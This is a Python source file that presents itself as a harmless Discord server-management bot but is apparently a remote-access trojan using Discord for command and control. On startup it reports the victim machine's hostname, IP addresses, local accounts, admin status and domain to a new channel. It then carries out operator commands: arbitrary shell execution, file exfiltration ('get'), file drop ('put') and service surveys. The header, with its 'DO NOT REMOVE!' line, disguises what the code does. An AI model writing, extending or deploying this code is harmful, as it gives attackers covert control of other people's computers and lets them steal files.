"""
    Discord bot client v0.1 by INSERT_NAME
    Used for server management, logging, and utility functions.
    DO NOT REMOVE!
    Please reach out to INSERT_NAME with any questions.
"""

import ctypes
import glob
import json
import importlib
import os
import platform
import random
import re
import shutil
import socket
import string
import subprocess
import sys
from datetime import timedelta
from pathlib import Path

DEPS_LOCATION = ".deps"

def ensure_wheel(package_name, import_name=None, dest=None):
    dest_path = Path(dest)
    dest_path.mkdir(exist_ok=True)

    if import_name is None:
        import_name = package_name.replace("-", "_").replace(".", "_")

    if str(dest_path) not in sys.path:
        sys.path.insert(0, str(dest_path))

    try:
        return importlib.import_module(import_name)
    except ImportError:
        # Requires pip install rather than download because of the way its submodules are setup
        if "discord" in package_name:
            subprocess.check_call([
                sys.executable, "-m", "pip", "install",
                "--upgrade", "--target", str(dest_path), package_name
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL)
        else:
            # Download wheel into current directory
            subprocess.check_call([
                sys.executable, "-m", "pip", "download", "--dest", str(dest_path), package_name
            ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
            )

        # Find wheel and add to sys.path
        for wheel in dest_path.glob("*.whl"):
            w = str(wheel.resolve())
            if w not in sys.path:
                sys.path.insert(0, w)
        
        return importlib.import_module(import_name)

# runtime imports
tabulate = ensure_wheel("tabulate", dest=DEPS_LOCATION)
discord = ensure_wheel("discord.py", import_name="discord", dest=DEPS_LOCATION)
from discord.ext import commands

CHECKIN_CHANNELS = set()
LOCKFILE = Path("C:\\Windows\\Temp\\dbtagt.tmp")
JSON_FORMAT_PREFIX = "```json\n"
BOT_LISTEN_FOR_ID = int(input("Enter ID: "))
if not BOT_LISTEN_FOR_ID:
    print("ID is required.")
    exit(1)
    
try:
    intents = discord.Intents.default()
    intents.message_content = True
    bot = commands.Bot(command_prefix="!", intents=intents)
except Exception as e:
    exit(1)

def main():
    token = input("Enter the discord bot token: ")
    if not token:
        print("Token is required.")
        exit(1)
    
    bot.run(token)

def random_alphanumeric(length):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def get_device_metadata():
    """
        Returns some initial metadata about the device.
    """
    metadata = {}
    
    hostname = socket.gethostname()

    _, _, iplist = socket.gethostbyname_ex(hostname)
    filtered_ips = [ip for ip in iplist if not ip.startswith("127.")]

    uname = platform.uname()
    winver = platform.win32_ver()
    local_accts = get_local_user_accounts()
    is_local_admin = get_local_admin_status()
    userdomain = os.environ.get("USERDOMAIN")
    logonserver = os.environ.get("LOGONSERVER")

    output_dict = {
        "hostname": hostname,
        "ip_list": filtered_ips,
        "os_info": str(uname)+str(winver),
        "accounts": local_accts,
        "is_local_admin": is_local_admin,
        "userdomain": userdomain,
        "logonserver": logonserver,
        "version": "1.0"
    }

    return json.dumps(output_dict, indent=4), output_dict

def get_local_user_accounts():
    """
        Returns local accounts by parsing 'net1 user' output.
    """
    users = {"local_accounts": []}

    try:
        proc = subprocess.run(["net1", "user"], capture_output=True, text=True, check=True)
        out = proc.stdout

        # 'net user' prints a header, then user names in columns, then a footer.
        # Extract lines between the header/footer and split.
        lines = out.splitlines()
        capture = False
        names = []
        for line in lines:
            if "----" in line:
                capture = not capture
                continue
            if "The command completed successfully" in line:
                continue
            if capture:
                tokens = [tok for tok in line.split() if tok]
                names.extend(tokens)
        users["local_accounts"] = sorted(set(names))
    except Exception as e:
        users["local_accounts"] = [f"Failed to run 'net user': {e}"]

    return users

def get_services():
    """
        Returns a service listing by using sc query.
        Parses for service name, display name, and state.
    """
    output = subprocess.check_output("sc query type= service state= all", shell=True, text=True)

    services = []
    current = {}

    for line in output.splitlines():
        line = line.strip()
        if line.startswith("SERVICE_NAME:"):
            # save the previous one
            if current:
                services.append(current)

            current = {"SERVICE_NAME": line.split(":", 1)[1].strip()}
        elif line.startswith("DISPLAY_NAME:") and current is not None:
            current["DISPLAY_NAME"] = line.split(":", 1)[1].strip()
        elif line.startswith("STATE") and current is not None:
            match = re.search(r":\s+\d+\s+(\w+)", line)
            if match:
                current["STATE"] = match.group(1)

    if current:
        services.append(current)

    return services

def get_uptime():
    """
        Returns the uptime of the device.
        Prevent overflow by ensuring ret type is unsigned 64-bit.
    """
    GetTickCount64 = ctypes.windll.kernel32.GetTickCount64
    GetTickCount64.restype = ctypes.c_ulonglong

    return timedelta(milliseconds=GetTickCount64())

def get_local_admin_status():
    """
        Returns true if the current process is running under a local admin,
        False otherwise.
    """
    result = subprocess.run(
        ["whoami", "/groups"],
        capture_output=True,
        text=True,
        shell=True
    )
    return "S-1-5-32-544" in result.stdout

async def process_put_file(attachments, message_str):
    """
        Parse and execute put file command.
    """
    parts = message_str.strip().split(maxsplit=1)
    dest_arg = parts[1] if len(parts) > 1 else "."
    base_cwd = Path.cwd()

    if len(attachments) > 1:
        return "Error: Put can only process a single file."

    att = attachments[0]
    resolved_destination_path = resolve_path(base_cwd, dest_arg, att.filename)
    try:
        await att.save(resolved_destination_path)
        return f"Put: saved attachment to {resolved_destination_path}"
    except Exception as e:
        return str(e)

def resolve_path(base_cwd, dest_arg, filename):
    """
        Return the file path where a single attachment should be saved,
        interpreting dest_arg as either a directory or a file path.
    """
    # allow quoting in path
    raw = dest_arg.strip().strip('"')
    p = Path(raw).expanduser()

    if not p.is_absolute():
        p = base_cwd / p

    # If arg ends with a path separator OR points to an existing dir -> treat as dir
    if raw.endswith(("\\", "/")) or (p.exists() and p.is_dir()):
        p = p / att_name

    # Resolve even if it doesn't exist yet
    return p.resolve(strict=False)

def process_command(cmd_str):
    """
        Parse command and pass to the appropriate function.
    """
    usage_string = "Invalid command.\n\n"
    usage_string += "Usage:\n"
    usage_string += "cd <directory>\n"
    usage_string += "exec <cmd>\n"
    usage_string += "get <file path>\n"
    usage_string += "ls <directory>\n"
    usage_string += "lt <directory>\n"
    usage_string += "put <file path>\n"
    usage_string += "pwd\n"
    usage_string += "survey\n"
    usage_string += "exit"

    parts = cmd_str.split(maxsplit=1)
    if not parts:
        return usage_string

    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else None

    commands = {
        "exec": execute_command,
        "get": get_content,
        "survey": run_survey
    }

    # This is a bit buggy at the moment, prints a stack trace when its done
    if cmd == "exit":
        do_exit()

    elif cmd == "help":
        # Output usage string, but be nicer (they asked for help after all)
        output = usage_string.replace("Invalid command.","")
    elif cmd == "survey":
        output = run_survey()
    elif cmd == "cd":
        output = change_directory(cmd_str)
    elif cmd == "lt":
        output = list_directory(cmd_str, time_sort=True)
    elif cmd == "ls":
        output = list_directory(cmd_str)
    elif cmd == "pwd":
        output = f"CWD: {os.getcwd()}"
    elif cmd in commands:
        output = commands[cmd](arg)
    else:
        output = usage_string

    return output

def change_directory(cd_str):
    """
        Process cd commands with os.chdir().
    """
    try:
        # If the command is JUST "cd", return the cwd,
        # to be consistent with windows shell behavior.
        if cd_str == "cd":
            result = f"{os.getcwd()}"
        else:
            os.chdir(cd_str.split()[1])
            result = f"Changed directory to {os.getcwd()}"
    except Exception as e:
        result = f"Error: {e}"

    return result

def list_directory(cmd_str, time_sort=False):
    """
        Wrapper for running a directory listing.
    """
    if time_sort:
        return execute_command(cmd_str.replace("lt", "dir") + " /O:D")
    else:
        return execute_command(cmd_str.replace("ls", "dir"))

def execute_command(cmd_str):
    """
        Execute a command on behalf of the bot.
    """    
    # Process other commands with subprocess.run()
    output = subprocess.run(
        cmd_str,
        shell=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )

    result = output.stdout

    if len(result) > 0:
        return result
    else:
        return "Command returned no output"

def get_content(upload):
    """
        upload: full path to the file to retrieve
    """
    try:
        # Reads whole file into memory;
        # may not work well with large files
        p = Path(upload)
        return discord.File(upload, filename=p.name)

    except FileNotFoundError as e:
        return str(e)
    except PermissionError as e:
        return str(e)
    except OSError as e:
        return str(e)
    except Exception as e:
        return str(e)

def run_survey():
    """
        Return some basic device information.
    """
    survey_results = "-"*16+"\n"
    survey_results += "SURVEY RESULTS\n"
    survey_results += "-"*16+"\n\n"
    survey_results += f"Uptime: {get_uptime()}\n"
    survey_results += "Service listing:\n"
    survey_results += display_services(svc_state="RUNNING")
    return survey_results

def display_services(svc_state="ALL"):
    """
        Return a table of services matching the given state.
    """
    services = get_services()
    if svc_state == "ALL":
        services = [s for s in get_services()]
    else:
        services = [s for s in get_services() if s.get("STATE") == svc_state]

    table = [(s["SERVICE_NAME"], s.get("DISPLAY_NAME", ""), s.get("STATE", "")) for s in services]
    return tabulate.tabulate(table, headers=["Service Name", "Display Name", "State"], tablefmt="github")

def do_exit():
    exit(0)

async def send_message_wrapper(channel, output, is_file=False, prefix="```", suffix="```"):
    if is_file:
        content = "📎 See attachment:"
        await channel.send(content=content, file=output)

    else:
        """Split long text into <=2000 char chunks and send sequentially."""
        max_length = 2000 - len(prefix) - len(suffix)
        for i in range(0, len(output), max_length):
            chunk = output[i:i+max_length]
            await channel.send(f"{prefix}{chunk}{suffix}")

# Runs after Bot() object is created
@bot.event
async def on_ready():
    metadata_pretty, metadata = get_device_metadata()

    # Get channel_name from LOCKFILE if it exists
    if LOCKFILE.exists():
        channel_name = LOCKFILE.read_text(encoding="utf-8")
    else:
        channel_name = (metadata['hostname'] + "-" + random_alphanumeric(4)).lower()

    for guild in bot.guilds:
        existing = discord.utils.get(guild.text_channels, name=channel_name)
        if not existing:
            new_channel = await guild.create_text_channel(channel_name)
            await new_channel.send("📡 New device checked in!")
            await send_message_wrapper(new_channel, metadata_pretty, prefix=JSON_FORMAT_PREFIX)

            CHECKIN_CHANNELS.add(channel_name)
            LOCKFILE.write_text(str(channel_name), encoding="utf-8")

        else:
            CHECKIN_CHANNELS.add(channel_name)
            await existing.send("📡 Device has checked in again!")
            await send_message_wrapper(existing, metadata_pretty, prefix=JSON_FORMAT_PREFIX)

# Runs when a message is seen in any of its channels
@bot.event
async def on_message(message):
    # Ignore other bots (including ourselves)
    if message.author.bot:
        return
    
    # Only process messages in the relevant channel
    if message.channel.name not in CHECKIN_CHANNELS:
        return

    if(message.author.id == BOT_LISTEN_FOR_ID):
        if message.content.strip().lower().startswith("put"):
            if not message.attachments:
                # If the user typed put but didnt attach anything, error
                output = "Error: you must attach a file with the 'put' command."
            else:
                output = await process_put_file(message.attachments, message.content)

        elif message.attachments:
            # If there is an attachment, but user didn't type 'put', display an error
            output = "Error: if you want to upload a file, you must attach it and use the 'put' command."
        else:
            # Process non-putfile commands
            output = process_command(message.content)

        if isinstance(output, discord.File):
            await send_message_wrapper(message.channel, output, is_file=True)
        else:
            await send_message_wrapper(message.channel, output)

if __name__ == "__main__":
    main()